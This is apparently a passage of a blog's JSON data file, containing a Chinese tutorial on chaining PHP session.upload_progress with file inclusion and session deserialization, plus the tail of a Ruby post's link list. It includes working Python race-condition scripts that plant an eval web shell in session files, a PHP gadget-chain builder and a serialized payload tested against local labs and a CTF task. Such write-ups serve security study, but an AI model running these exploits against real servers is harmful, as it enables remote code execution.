title=\"参考链接\"></a><strong>参考链接</strong></h3><blockquote>\n<p><a class=\"link\"   href=\"https://hackerone.com/ruby/hacktivity\" >https://hackerone.com/ruby/hacktivity<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bishopfox.com/blog/ruby-vulnerabilities-exploits\" >https://bishopfox.com/blog/ruby-vulnerabilities-exploits<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://zenn.dev/ooooooo/_q/books/rails/_deserialize\" >https://zenn.dev/ooooooo\\_q/books/rails\\_deserialize<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://gavinmiller.io/2016/the-safesty-way-to-constantize/\" >http://gavinmiller.io/2016/the-safesty-way-to-constantize/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md\" >https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.elttam.com/blog/ruby-deserialization/\" >https://www.elttam.com/blog/ruby-deserialization/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\" >https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions\" >https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n"},{"title":"session反序列化","date":"2023-02-13T15:31:54.000Z","excerpt":"session反序列化","_content":"\n## 前言\n\n**本文主要是利用PHP中的`session.upload_progress`功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。**\n\n## php中的session.upload\\_progress\n\n这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。\n\n在php.ini有以下几个默认选项\n\n```auto\n1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = \"upload_progress_\"4. session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"5. session.upload_progress.freq = \"1%\"6. session.upload_progress.min_freq = \"1\"\n```\n\n其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。\n\n> `enabled=on`表示`upload_progress`功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；\n>\n> `cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；\n>\n> `name`当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；\n>\n> `prefix+name`将表示为session中的键名\n\n## session相关配置及session反序列化\n\n因为这个不是本文的重点，所以这里附上几个相关链接。\n\n> [https://www.cnblogs.com/iamstudy/articles/php\\_serialize\\_problem.html](https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html)\n>\n> [https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm\\_source=tuicool&utm\\_medium=referral](https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral)\n\n另外，再添加个session配置中一个重要选项。\n\n`session.use_strict_mode=off`这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。\n\n## 利用session.upload\\_progress进行文件包含利用\n\n### 测试环境\n\n> php5.5.38\n>\n> win10\n>\n> 关于session相关的一切配置都是默认值\n\n### 示例代码\n\n```auto\n<?php$b=$_GET['file'];include \"$b\";?>\n```\n\n可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用`session.upload_progress`将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。\n\n### 分析\n\n**问题一**\n\n代码里没有`session_start()`,如何创建session文件呢。\n\n**解答一**\n\n其实，如果`session.auto_start=On` ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session\\_start()。但默认情况下，这个选项都是关闭的。\n\n但session还有一个默认选项，session.use\\_strict\\_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess\\_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(\"session.upload\\_progress.prefix\")+由我们构造的session.upload\\_progress.name值组成，最后被写入sess\\_文件里。\n\n**问题二**\n\n但是问题来了，默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空，\n\n**如何进行rce呢？**\n\n**解答二**\n\n此时我们可以利用竞争，在session文件内容清空前进行包含利用。\n\n### 利用脚本\n\n```auto\n#coding=utf-8import ioimport requestsimport threadingsessid = 'TGAO'data = {\"cmd\":\"system('whoami');\"}def write(session):    while True:        f = io.BytesIO(b'a' * 1024 * 50)        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[\"cmd\"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session):    while True:        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)        if 'tgao.txt' in resp.text:            print(resp.text)            event.clear()        else:            print(\"[+++++++++++++]retry\")if __name__==\"__main__\":    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()\n```\n\n效果如下图\n\n![利用session.upload_progress进行文件包含和反序列化渗透](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145210.jpeg)\n\n### ctf题目\n\n在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。\n\n```auto\n<html>    <?php    error_reporting(0);    $file = $_GET[\"file\"];    $payload = $_GET[\"payload\"];    if(!isset($file)){        echo 'Missing parameter'.'<br>';    }    if(preg_match(\"/flag/\",$file)){        die('hack attacked!!!');    }    @include($file);    if(isset($payload)){        $url = parse_url($_SERVER['REQUEST_URI']);        parse_str($url['query'],$query);        foreach($query as $value){            if (preg_match(\"/flag/\",$value)) {                die('stop hacking!');                exit();            }        }        $payload = unserialize($payload);    }else{       echo \"Missing parameters\";    }    ?>    <!--Please test index.php?file=xxx.php -->    <!--Please get the source of hint.php-->    </html>\n```\n\n在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量`$file`加了过滤，不过没什么影响。\n\n利用思路一样，这里就不再说了，网上也有相应的解法。\n\n### 小结\n\n**利用条件**\n\n> 1\\. 存在文件包含漏洞\n>\n> 2\\. 知道session文件存放路径，可以尝试默认路径\n>\n> 3\\. 具有读取和写入session文件的权限\n\n## 利用session.upload\\_progress进行反序列化攻击\n\n### 测试环境\n\n> php5.5.38\n>\n> win10\n>\n> `session.serialize_handler=php_serialize`，其余session相关配置为默认值\n\n### 示例代码\n\n```auto\n<?phperror_reporting(0);date_default_timezone_set(\"Asia/Shanghai\");ini_set('session.serialize_handler','php');session_start();class Door{    public $handle;    function __construct() {        $this->handle=new TimeNow();    }    function __destruct() {        $this->handle->action();    }}class TimeNow {    function action() {        echo \"你的访问时间:\".\"  \".date('Y-m-d H:i:s',time());    }}class  IP{    public $ip;    function __construct() {        $this->ip = 'echo $_SERVER[\"REMOTE_ADDR\"];';    }    function action() {        eval($this->ip);    }}?>\n```\n\n### 分析\n\n**问题一**\n\n整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢\n\n**解答一**\n\n这里，利用`PHP_SESSION_UPLOAD_PROGRESS`上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。\n\n另外，与文件包含利用一样，也需要进行竞争。\n\n### 利用脚本\n\n首先利用exp.php脚本构造恶意序列化语句\n\n```auto\n<?phpini_set('session.serialize_handler', 'php_serialize');session_start();class Door{    public $handle;    function __construct() {        $this->handle = new IP();    }    function __destruct() {        $this->handle->action();    }}class TimeNow {    function action() {        echo \"你的访问时间:\".\"  \".date('Y-m-d H:i:s',time());    }}class  IP{    public $ip;    function __construct() {        //$this->ip='payload';        $this->ip='phpinfo();';        //$this->ip='print_r(scandir('/'));';    }    function action() {        eval($this->ip);    }}$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(\"O:4:\",\"|O:4:\",$c);echo $d;?>\n```\n\n其此利用exp.py脚本进行竞争\n\n```auto\n#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b'a' * 1024 *1024*1)    while True:        et.wait()        url = 'http://'+ip+':'+str(port)+'/test5.php'        headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',        'DNT': '1',        'Cookie': 'PHPSESSID=20190506',        'Connection': 'close',        'Upgrade-Insecure-Requests': '1'        }        proxy = {        'http': '127.0.0.1:8080'        }        data={'PHP_SESSION_UPLOAD_PROGRESS':'123'}        files={            'file':(r'|O:4:\\\"Door\\\":1:{s:6:\\\"handle\\\";O:2:\\\"IP\\\":1:{s:2:\\\"ip\\\";s:10:\\\"phpinfo();\\\";}}',f,'text/plain')        }        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=\"utf-8\"        if len(resp.text)<2000:            print('[+++++]retry')        else:            print(resp.content.decode('utf-8').encode('utf-8'))            et.clear()            print('success!')            if __name__ == \"__main__\":    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()\n```\n\n首先在代码里加个代理，利用burp抓包。如下图\n\n![利用session.upload_progress进行文件包含和反序列化渗透](https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small)\n\n这里有几个注意点：\n\n> PHPSESSID必须要有，因为要竞争同一个文件\n>\n> filename可控，但是在值的最前面加上`|`,因为最终目的是利用session的反序列化，`PHP_SESSION_UPLOAD_PROGRESS`只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突\n>\n> 上传的文件要大些，否则很难竞争成功。我写入是这么大`f = io.BytesIO(b'a' * 1024 *1024*1)`\n>\n> filename值中出现汉字时，会出错，所以在利用脚本前，[一定要修改python源码](https://blog.csdn.net/iriszx999/article/details/82113521)\n\n最后把`exp.py`中的代理去掉，直接跑`exp.py`,效果如下。\n\n![利用session.upload_progress进行文件包含和反序列化渗透](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145729.jpeg)\n\n### 几次失败尝试\n\n> 其实，利用burp抓到`exp.py`流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。\n>\n> 另外，我尝试伪造`PHP_SESSION_UPLOAD_PROGRESS`的值，但是值中一旦出现`|`，将会导致数据写入session文件失败。\n\n### 小结\n\n利用条件主要是存在session反序列化漏洞。\n\n从文件包含和反序列化两个利用点，可以发现，利用`PHP_SESSION_UPLOAD_PROGRESS`可以绕过大部分过滤，而且传输的数据也不易发现。\n\n","source":"_posts/利用session.upload_progress进行文件包含和反序列化渗透 .md","raw":"---\ntitle: session反序列化\ndate: 2023-02-13 23:31:54\nexcerpt: session反序列化\ncategories: 学习\n---\n\n## 前言\n\n**本文主要是利用PHP中的`session.upload_progress`功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。**\n\n## php中的session.upload\\_progress\n\n这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。\n\n在php.ini有以下几个默认选项\n\n```auto\n1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = \"upload_progress_\"4. session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"5. session.upload_progress.freq = \"1%\"6. session.upload_progress.min_freq = \"1\"\n```\n\n其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。\n\n> `enabled=on`表示`upload_progress`功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；\n>\n> `cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；\n>\n> `name`当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；\n>\n> `prefix+name`将表示为session中的键名\n\n## session相关配置及session反序列化\n\n因为这个不是本文的重点，所以这里附上几个相关链接。\n\n> [https://www.cnblogs.com/iamstudy/articles/php\\_serialize\\_problem.html](https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html)\n>\n> [https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm\\_source=tuicool&utm\\_medium=referral](https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral)\n\n另外，再添加个session配置中一个重要选项。\n\n`session.use_strict_mode=off`这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。\n\n## 利用session.upload\\_progress进行文件包含利用\n\n### 测试环境\n\n> php5.5.38\n>\n> win10\n>\n> 关于session相关的一切配置都是默认值\n\n### 示例代码\n\n```auto\n<?php$b=$_GET['file'];include \"$b\";?>\n```\n\n可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用`session.upload_progress`将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。\n\n### 分析\n\n**问题一**\n\n代码里没有`session_start()`,如何创建session文件呢。\n\n**解答一**\n\n其实，如果`session.auto_start=On` ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session\\_start()。但默认情况下，这个选项都是关闭的。\n\n但session还有一个默认选项，session.use\\_strict\\_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess\\_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(\"session.upload\\_progress.prefix\")+由我们构造的session.upload\\_progress.name值组成，最后被写入sess\\_文件里。\n\n**问题二**\n\n但是问题来了，默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空，\n\n**如何进行rce呢？**\n\n**解答二**\n\n此时我们可以利用竞争，在session文件内容清空前进行包含利用。\n\n### 利用脚本\n\n```auto\n#coding=utf-8import ioimport requestsimport threadingsessid = 'TGAO'data = {\"cmd\":\"system('whoami');\"}def write(session):    while True:        f = io.BytesIO(b'a' * 1024 * 50)        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[\"cmd\"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session):    while True:        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)        if 'tgao.txt' in resp.text:            print(resp.text)            event.clear()        else:            print(\"[+++++++++++++]retry\")if __name__==\"__main__\":    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()\n```\n\n效果如下图\n\n![利用session.upload_progress进行文件包含和反序列化渗透](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145210.jpeg)\n\n### ctf题目\n\n在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。\n\n```auto\n<html>    <?php    error_reporting(0);    $file = $_GET[\"file\"];    $payload = $_GET[\"payload\"];    if(!isset($file)){        echo 'Missing parameter'.'<br>';    }    if(preg_match(\"/flag/\",$file)){        die('hack attacked!!!');    }    @include($file);    if(isset($payload)){        $url = parse_url($_SERVER['REQUEST_URI']);        parse_str($url['query'],$query);        foreach($query as $value){            if (preg_match(\"/flag/\",$value)) {                die('stop hacking!');                exit();            }        }        $payload = unserialize($payload);    }else{       echo \"Missing parameters\";    }    ?>    <!--Please test index.php?file=xxx.php -->    <!--Please get the source of hint.php-->    </html>\n```\n\n在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量`$file`加了过滤，不过没什么影响。\n\n利用思路一样，这里就不再说了，网上也有相应的解法。\n\n### 小结\n\n**利用条件**\n\n> 1\\. 存在文件包含漏洞\n>\n> 2\\. 知道session文件存放路径，可以尝试默认路径\n>\n> 3\\. 具有读取和写入session文件的权限\n\n## 利用session.upload\\_progress进行反序列化攻击\n\n### 测试环境\n\n> php5.5.38\n>\n> win10\n>\n> `session.serialize_handler=php_serialize`，其余session相关配置为默认值\n\n### 示例代码\n\n```auto\n<?phperror_reporting(0);date_default_timezone_set(\"Asia/Shanghai\");ini_set('session.serialize_handler','php');session_start();class Door{    public $handle;    function __construct() {        $this->handle=new TimeNow();    }    function __destruct() {        $this->handle->action();    }}class TimeNow {    function action() {        echo \"你的访问时间:\".\"  \".date('Y-m-d H:i:s',time());    }}class  IP{    public $ip;    function __construct() {        $this->ip = 'echo $_SERVER[\"REMOTE_ADDR\"];';    }    function action() {        eval($this->ip);    }}?>\n```\n\n### 分析\n\n**问题一**\n\n整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢\n\n**解答一**\n\n这里，利用`PHP_SESSION_UPLOAD_PROGRESS`上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。\n\n另外，与文件包含利用一样，也需要进行竞争。\n\n### 利用脚本\n\n首先利用exp.php脚本构造恶意序列化语句\n\n```auto\n<?phpini_set('session.serialize_handler', 'php_serialize');session_start();class Door{    public $handle;    function __construct() {        $this->handle = new IP();    }    function __destruct() {        $this->handle->action();    }}class TimeNow {    function action() {        echo \"你的访问时间:\".\"  \".date('Y-m-d H:i:s',time());    }}class  IP{    public $ip;    function __construct() {        //$this->ip='payload';        $this->ip='phpinfo();';        //$this->ip='print_r(scandir('/'));';    }    function action() {        eval($this->ip);    }}$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(\"O:4:\",\"|O:4:\",$c);echo $d;?>\n```\n\n其此利用exp.py脚本进行竞争\n\n```auto\n#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b'a' * 1024 *1024*1)    while True:        et.wait()        url = 'http://'+ip+':'+str(port)+'/test5.php'        headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',        'DNT': '1',        'Cookie': 'PHPSESSID=20190506',        'Connection': 'close',        'Upgrade-Insecure-Requests': '1'        }        proxy = {        'http': '127.0.0.1:8080'        }        data={'PHP_SESSION_UPLOAD_PROGRESS':'123'}        files={            'file':(r'|O:4:\\\"Door\\\":1:{s:6:\\\"handle\\\";O:2:\\\"IP\\\":1:{s:2:\\\"ip\\\";s:10:\\\"phpinfo();\\\";}}',f,'text/plain')        }        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=\"utf-8\"        if len(resp.text)<2000:            print('[+++++]retry')        else:            print(resp.content.decode('utf-8').encode('utf-8'))            et.clear()            print('success!')            if __name__ == \"__main__\":    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()\n```\n\n首先在代码里加个代理，利用burp抓包。如下图\n\n![利用session.upload_progress进行文件包含和反序列化渗透](https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small)\n\n这里有几个注意点：\n\n> PHPSESSID必须要有，因为要竞争同一个文件\n>\n> filename可控，但是在值的最前面加上`|`,因为最终目的是利用session的反序列化，`PHP_SESSION_UPLOAD_PROGRESS`只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突\n>\n> 上传的文件要大些，否则很难竞争成功。我写入是这么大`f = io.BytesIO(b'a' * 1024 *1024*1)`\n>\n> filename值中出现汉字时，会出错，所以在利用脚本前，[一定要修改python源码](https://blog.csdn.net/iriszx999/article/details/82113521)\n\n最后把`exp.py`中的代理去掉，直接跑`exp.py`,效果如下。\n\n![利用session.upload_progress进行文件包含和反序列化渗透](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145729.jpeg)\n\n### 几次失败尝试\n\n> 其实，利用burp抓到`exp.py`流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。\n>\n> 另外，我尝试伪造`PHP_SESSION_UPLOAD_PROGRESS`的值，但是值中一旦出现`|`，将会导致数据写入session文件失败。\n\n### 小结\n\n利用条件主要是存在session反序列化漏洞。\n\n从文件包含和反序列化两个利用点，可以发现，利用`PHP_SESSION_UPLOAD_PROGRESS`可以绕过大部分过滤，而且传输的数据也不易发现。\n\n","slug":"利用session.upload_progress进行文件包含和反序列化渗透 ","published":1,"updated":"2024-04-25T13:59:56.046Z","_id":"clvfb4qrg000166761rxu5ykz","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p><strong>本文主要是利用PHP中的<code>session.upload_progress</code>功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。</strong></p>\n<h2 id=\"php中的session-upload-progress\"><a href=\"#php中的session-upload-progress\" class=\"headerlink\" title=\"php中的session.upload_progress\"></a>php中的session.upload_progress</h2><p>这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。</p>\n<p>在php.ini有以下几个默认选项</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。</p>\n<blockquote>\n<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>\n<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>\n<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>\n<p><code>prefix+name</code>将表示为session中的键名</p>\n</blockquote>\n<h2 id=\"session相关配置及session反序列化\"><a href=\"#session相关配置及session反序列化\" class=\"headerlink\" title=\"session相关配置及session反序列化\"></a>session相关配置及session反序列化</h2><p>因为这个不是本文的重点，所以这里附上几个相关链接。</p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html\" >https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral\" >https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source&#x3D;tuicool&amp;utm_medium&#x3D;referral<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>另外，再添加个session配置中一个重要选项。</p>\n<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。</p>\n<h2 id=\"利用session-upload-progress进行文件包含利用\"><a href=\"#利用session-upload-progress进行文件包含利用\" class=\"headerlink\" title=\"利用session.upload_progress进行文件包含利用\"></a>利用session.upload_progress进行文件包含利用</h2><h3 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h3><blockquote>\n<p>php5.5.38</p>\n<p>win10</p>\n<p>关于session相关的一切配置都是默认值</p>\n</blockquote>\n<h3 id=\"示例代码\"><a href=\"#示例代码\" class=\"headerlink\" title=\"示例代码\"></a>示例代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php$b=$_GET[&#x27;file&#x27;];include &quot;$b&quot;;?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p><strong>问题一</strong></p>\n<p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p>\n<p><strong>解答一</strong></p>\n<p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>\n<p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>\n<p><strong>问题二</strong></p>\n<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>\n<p><strong>如何进行rce呢？</strong></p>\n<p><strong>解答二</strong></p>\n<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>\n<h3 id=\"利用脚本\"><a href=\"#利用脚本\" class=\"headerlink\" title=\"利用脚本\"></a>利用脚本</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;TGAO&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;whoami&#x27;);&quot;&#125;def write(session):    while True:        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)        resp = session.post( &#x27;http://127.0.0.1:5555/test56.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session):    while True:        resp = session.post(&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;+sessid,data=data)        if &#x27;tgao.txt&#x27; in resp.text:            print(resp.text)            event.clear()        else:            print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;:    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()</span><br></pre></td></tr></table></figure>\n\n<p>效果如下图</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145210.jpeg\"\n                        alt=\"利用session.upload_progress进行文件包含和反序列化渗透\"\n                 ></p>\n<h3 id=\"ctf题目\"><a href=\"#ctf题目\" class=\"headerlink\" title=\"ctf题目\"></a>ctf题目</h3><p>在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;    &lt;?php    error_reporting(0);    $file = $_GET[&quot;file&quot;];    $payload = $_GET[&quot;payload&quot;];    if(!isset($file))&#123;        echo &#x27;Missing parameter&#x27;.&#x27;&lt;br&gt;&#x27;;    &#125;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        die(&#x27;hack attacked!!!&#x27;);    &#125;    @include($file);    if(isset($payload))&#123;        $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);        parse_str($url[&#x27;query&#x27;],$query);        foreach($query as $value)&#123;            if (preg_match(&quot;/flag/&quot;,$value)) &#123;                die(&#x27;stop hacking!&#x27;);                exit();            &#125;        &#125;        $payload = unserialize($payload);    &#125;else&#123;       echo &quot;Missing parameters&quot;;    &#125;    ?&gt;    &lt;!--Please test index.php?file=xxx.php --&gt;    &lt;!--Please get the source of hint.php--&gt;    &lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量<code>$file</code>加了过滤，不过没什么影响。</p>\n<p>利用思路一样，这里就不再说了，网上也有相应的解法。</p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p><strong>利用条件</strong></p>\n<blockquote>\n<p>1. 存在文件包含漏洞</p>\n<p>2. 